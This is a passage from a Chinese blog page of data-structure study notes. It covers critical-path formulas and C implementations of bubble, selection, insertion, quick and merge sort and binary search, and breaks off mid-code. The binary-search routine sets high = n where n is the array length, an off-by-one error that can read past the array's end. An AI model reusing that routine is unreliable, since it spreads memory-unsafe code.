738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(11022.3,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="msub" transform="translate(12022.6,0)"><g data-mml-node="mi"><path data-c="1D464" d="M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z"></path></g><g data-mml-node="TeXAtom" transform="translate(749,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g><g data-mml-node="mo" transform="translate(412,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(690,0)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g></g></g></g></g></svg></mjx-container></j,k></li></ul><p>如何求ve(j)和vl(j)？</p><ul><li><p>从ve(1)=0开始向前递推</p><script type="math/tex; mode=display">ve(j)=\max_{i}\{ve(i)+w_{i,j}\},<i,j>\in T,2\le j\le n</script><p>其中T是所有以j为头的弧的集合</p></li><li><p>从vl(n) = ve(n)开始向后递推</p><script type="math/tex; mode=display">vl(i)=\min_{j}\{vl(j)-w_{i,j} \},<i,j>\in S, 1\le i\le n-1</script><p>其中S是所有以i为尾的弧的集合</p></li></ul><img src="/posts/79666db/3.2.4.3.png" class="" title="关键路径例题"><h1 id="4-查找和排序"><a href="#4-查找和排序" class="headerlink" title="4. 查找和排序"></a>4. 查找和排序</h1><p>排序和查找的关系：排序是查找的前提，排序是重点。</p><h2 id="4-1-冒泡排序"><a href="#4-1-冒泡排序" class="headerlink" title="4.1 冒泡排序"></a>4.1 冒泡排序</h2><p>冒泡排序的基本思想：重复走访过要排序的元素列，依次比较两个相邻的元素，如果顺序错误就把它们交换过来。走访元素的工作是重复地进行直到没有相邻元素需要交换，也就是说该元素列已经排序完成。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ARR_LEN 255 <span class="comment">/*数组长度上限*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> elemType int <span class="comment">/*元素类型*/</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* 冒泡排序 */</span></span><br><span class="line"><span class="comment">/* 1. 从当前元素起，向后依次比较每一对相邻元素，若逆序则交换 */</span></span><br><span class="line"><span class="comment">/* 2. 对所有元素均重复以上步骤，直至最后一个元素 */</span></span><br><span class="line"><span class="comment">/* elemType arr[]: 排序目标数组; int len: 元素个数 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bubbleSort</span> <span class="params">(elemType arr[], <span class="type">int</span> len)</span> {</span><br><span class="line">    elemType temp;</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len<span class="number">-1</span>; i++) <span class="comment">/* 外循环为排序趟数，len个数进行len-1趟 */</span></span><br><span class="line">        <span class="keyword">for</span> (j=<span class="number">0</span>; j&lt;len<span class="number">-1</span>-i; j++) { <span class="comment">/* 内循环为每趟比较的次数，第i趟比较len-i次 */</span></span><br><span class="line">            <span class="keyword">if</span> (arr[j] &gt; arr[j+<span class="number">1</span>]) { <span class="comment">/* 相邻元素比较，若逆序则交换（升序为左大于右，降序反之） */</span></span><br><span class="line">                temp = arr[j];</span><br><span class="line">                arr[j] = arr[j+<span class="number">1</span>];</span><br><span class="line">                arr[j+<span class="number">1</span>] = temp;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">void</span>)</span> {</span><br><span class="line">    elemType arr[ARR_LEN] = {<span class="number">3</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">-7</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">-6</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">4</span>};</span><br><span class="line">    <span class="type">int</span> len = <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">     </span><br><span class="line">    bubbleSort (arr, len);</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; i++)</span><br><span class="line">        <span class="built_in">printf</span> (<span class="string">"%d\t"</span>, arr[i]);</span><br><span class="line">    <span class="built_in">putchar</span> (<span class="string">'\n'</span>);</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h2 id="4-2-选择排序"><a href="#4-2-选择排序" class="headerlink" title="4.2 选择排序"></a>4.2 选择排序</h2><p>选择排序的基本思想：第一次从待排序的数据元素中选出最小（或最大）的一个元素，存放在序列的起始位置，然后再从剩余的未排序元素中寻找到最小（大）元素，然后放到已排序的序列的末尾。以此类推，直到全部待排序的数据元素的个数为零。选择排序是不稳定的排序方法。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">choseSort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> n)</span> {</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="type">int</span> min, temp;</span><br><span class="line">    <span class="comment">// 每次从未排序的部分选出一个最小的元素，最后一次只剩一个元素未排序</span></span><br><span class="line">    <span class="comment">// 此时实际上已经排好序，故只需要n-1次外层大循环</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; ++i) {</span><br><span class="line">        min = i;    <span class="comment">// 假定未排序部分的第一个元素为最小的元素</span></span><br><span class="line">        <span class="comment">// 遍历剩下的部分，找到最小的元素</span></span><br><span class="line">        <span class="keyword">for</span> (j = i + <span class="number">1</span>; j &lt; n; ++j) {</span><br><span class="line">            <span class="keyword">if</span> (arr[j] &lt; arr[min]) {</span><br><span class="line">                min = j;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">// 如果第一个元素就是最小的元素，就不需要交换了</span></span><br><span class="line">        <span class="keyword">if</span> (min != i) {</span><br><span class="line">            temp = arr[i];</span><br><span class="line">            arr[i] = arr[min];</span><br><span class="line">            arr[min] = temp;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">10</span>] = {<span class="number">5</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">7</span>};</span><br><span class="line">    choseSort(arr, <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>, arr[i]);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h2 id="4-3-插入排序"><a href="#4-3-插入排序" class="headerlink" title="4.3 插入排序"></a>4.3 插入排序</h2><p>插入排序的基本思想：将第一个待排序元素看做是一个有序序列，用下一个未排序元素，从后往前比较，然后放入到相应的位置，每比较一次有序序列就增加一个元素，这样就能把每个未排序的元素插入到相应的位置，将序列变得有序。</p><img src="/posts/79666db/%E6%8F%92%E5%85%A5%E6%8E%92%E5%BA%8F%E5%9B%BE%E8%A7%A3.png" class="" title="插入排序"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//插入排序 </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InsertSort</span><span class="params">(<span class="type">int</span>* a, <span class="type">int</span> len)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出数组中的元素 </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">OutputArray</span><span class="params">(<span class="type">int</span>* a, <span class="type">int</span> len)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> a[<span class="number">7</span>] = { <span class="number">2</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">6</span> };</span><br><span class="line"></span><br><span class="line">    <span class="comment">//输出数组中的元素 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"排序前的数据:"</span>);</span><br><span class="line">    OutputArray(a, <span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//插入排序 </span></span><br><span class="line">    InsertSort(a, <span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//输出排序后的结果 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"排序后的数据:"</span>);</span><br><span class="line">    OutputArray(a, <span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入排序 </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InsertSort</span><span class="params">(<span class="type">int</span> *a, <span class="type">int</span> len)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="type">int</span> temp;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; len; i++)</span><br><span class="line">    {</span><br><span class="line">        temp = a[i];</span><br><span class="line">        <span class="keyword">for</span> (j = i; j &gt; <span class="number">0</span> &amp;&amp; a[j - <span class="number">1</span>] &gt; temp; j--)</span><br><span class="line">        {</span><br><span class="line">            a[j] = a[j - <span class="number">1</span>];</span><br><span class="line">        }</span><br><span class="line">        a[j] = temp;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出数组中的元素 </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">OutputArray</span><span class="params">(<span class="type">int</span>* a, <span class="type">int</span> len)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>, a[i]);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h2 id="4-4-快速排序"><a href="#4-4-快速排序" class="headerlink" title="4.4 快速排序"></a>4.4 快速排序</h2><p>快速排序是对冒泡排序的一种改进。</p><p>快速排序算法通过多次比较和交换来实现排序，其排序流程如下：</p><p>(1)首先设定一个分界值，通过该分界值将数组分成左右两部分。</p><p>(2)将大于或等于分界值的数据集中到数组右边，小于分界值的数据集中到数组的左边。此时，左边部分中各元素都小于分界值，而右边部分中各元素都大于或等于分界值。 </p><p>(3)然后，左边和右边的数据可以独立排序。对于左侧的数组数据，又可以取一个分界值，将该部分数据分成左右两部分，同样在左边放置较小值，右边放置较大值。右侧的数组数据也可以做类似处理。</p><p>(4)重复上述过程，可以看出，这是一个递归定义。通过递归将左侧部分排好序后，再递归排好右侧部分的顺序。当左、右两个部分各数据排序完成后，整个数组的排序也就完成了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">QuickSort</span><span class="params">(<span class="type">int</span> *, <span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">FindPos</span><span class="params">(<span class="type">int</span> *, <span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> a[<span class="number">6</span>] = {<span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>};</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    QuickSort(a, <span class="number">0</span> , <span class="number">5</span>); <span class="comment">//第二个参数表示第一个元素的下标，第三个参数表示最后一个元素的下标</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>,a[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">QuickSort</span><span class="params">(<span class="type">int</span> * a, <span class="type">int</span> low, <span class="type">int</span> high)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> pos;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(low &lt; high)</span><br><span class="line">    {</span><br><span class="line">        pos = FindPos(a, low, high);</span><br><span class="line">        QuickSort(a, low, pos<span class="number">-1</span>);</span><br><span class="line">        QuickSort(a, pos+<span class="number">1</span>, high);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">FindPos</span><span class="params">(<span class="type">int</span> * a, <span class="type">int</span> low, <span class="type">int</span> high)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> val = a[low];</span><br><span class="line">    <span class="keyword">while</span>(low &lt; high)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">while</span>(low&lt;high &amp;&amp; a[high]&gt;=val)</span><br><span class="line">            --high;</span><br><span class="line">        a[low] = a[high];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(low&lt;high &amp;&amp; a[low]&lt;=val)</span><br><span class="line">            ++low;</span><br><span class="line">        a[high] = a[low];</span><br><span class="line">    } <span class="comment">//终止while循环之后low和high一定是相等的</span></span><br><span class="line"></span><br><span class="line">    a[low] = val;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> high; <span class="comment">//high可以改为low，但不能改为val 也不能改为a[low] 也不能改为a[high]</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure><h2 id="4-5-归并排序"><a href="#4-5-归并排序" class="headerlink" title="4.5 归并排序"></a>4.5 归并排序</h2><p>归并排序是建立在归并操作上的一种有效、稳定的排序算法，该算法是采用分治法（Divide and Conquer）的一个非常典型的应用。将已有序的子序列合并，得到完全有序的序列；即先使每个子序列有序，再使子序列段间有序。若将两个有序表合并成一个有序表，称为二路归并。</p><img src="/posts/79666db/%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F.png" class="" title="归并排序"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">Merge</span><span class="params">(<span class="type">int</span> sourceArr[],<span class="type">int</span> tempArr[], <span class="type">int</span> startIndex, <span class="type">int</span> midIndex, <span class="type">int</span> endIndex)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> i = startIndex, j=midIndex+<span class="number">1</span>, k = startIndex;</span><br><span class="line">    <span class="keyword">while</span>(i!=midIndex+<span class="number">1</span> &amp;&amp; j!=endIndex+<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>(sourceArr[i] &gt; sourceArr[j])</span><br><span class="line">            tempArr[k++] = sourceArr[j++];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            tempArr[k++] = sourceArr[i++];</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">while</span>(i != midIndex+<span class="number">1</span>)</span><br><span class="line">        tempArr[k++] = sourceArr[i++];</span><br><span class="line">    <span class="keyword">while</span>(j != endIndex+<span class="number">1</span>)</span><br><span class="line">        tempArr[k++] = sourceArr[j++];</span><br><span class="line">    <span class="keyword">for</span>(i=startIndex; i&lt;=endIndex; i++)</span><br><span class="line">        sourceArr[i] = tempArr[i];</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="comment">//内部使用递归</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">MergeSort</span><span class="params">(<span class="type">int</span> sourceArr[], <span class="type">int</span> tempArr[], <span class="type">int</span> startIndex, <span class="type">int</span> endIndex)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> midIndex;</span><br><span class="line">    <span class="keyword">if</span>(startIndex &lt; endIndex)</span><br><span class="line">    {</span><br><span class="line">        midIndex = startIndex + (endIndex-startIndex) / <span class="number">2</span>;<span class="comment">//避免溢出int</span></span><br><span class="line">        MergeSort(sourceArr, tempArr, startIndex, midIndex);</span><br><span class="line">        MergeSort(sourceArr, tempArr, midIndex+<span class="number">1</span>, endIndex);</span><br><span class="line">        Merge(sourceArr, tempArr, startIndex, midIndex, endIndex);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> a[<span class="number">8</span>] = {<span class="number">50</span>, <span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">70</span>, <span class="number">40</span>, <span class="number">80</span>, <span class="number">60</span>};</span><br><span class="line">    <span class="type">int</span> i, b[<span class="number">8</span>];</span><br><span class="line">    MergeSort(a, b, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>, a[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h2 id="4-6-折半查找"><a href="#4-6-折半查找" class="headerlink" title="4.6 折半查找"></a>4.6 折半查找</h2><p>折半查找的基本思想是：在有序表中，取中间记录作为比较对象，若给定值与中间记录的关键字相等，则查找成功；若给定值小于中间记录的关键字，则在中间记录的左半区继续查找；若给定值大于中间记录的关键字，则在中间记录的右半区继续查找。不断重复上述过程，直到查找成功或所有查找区域无记录，查找失败。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//折半查找,又称为二分查找,条件保证要升序排序</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">Binary_Search</span><span class="params">(<span class="type">int</span> *a,<span class="type">int</span> n,<span class="type">int</span> key)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> low,high,mid;</span><br><span class="line">    low = <span class="number">0</span>;    <span class="comment">//定义最低下标为记录首位</span></span><br><span class="line">    high = n;   <span class="comment">//记录最高下标为记录末位</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ( low &lt;= high )</span><br><span class="line">    {</span><br><span class="line">        mid = (low + high) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (key &lt; a[mid]) {</span><br><span class="line">            high = mid - <span class="number">1</span>;<span class="comment">//最高位下标调小 一位</span></span><br><span class="line">        } <span class="keyword">else</span> <span class="keyword">if</span>(key &gt; a[mid]){</span><br><span class="line">            low = mid + <span class="number">1</span>; <span class="comment">//最低下标调整到中位下标大一位</span></span><br><span class="line">        } <span class="keyword">else</span>{</span><br><span class="line">            <span class="keyword">return</span> mid; <span class="comment">//代表就是次位置</span></span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>; <span class="comment">//没有找到返回-1</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> a[] = {<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>};</span><br><span class="line"></span><br><span class="line">    <span class="comment">//需求要查找8, 如果用传统的方式 要查找8次才能得出</span></span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    index = Binary_Search(a, <span class="keyword">sizeof</span>(a) / <span class="keyword">sizeof</span>(<span class="type">int</span>),<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (index == <span class="number">-1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span 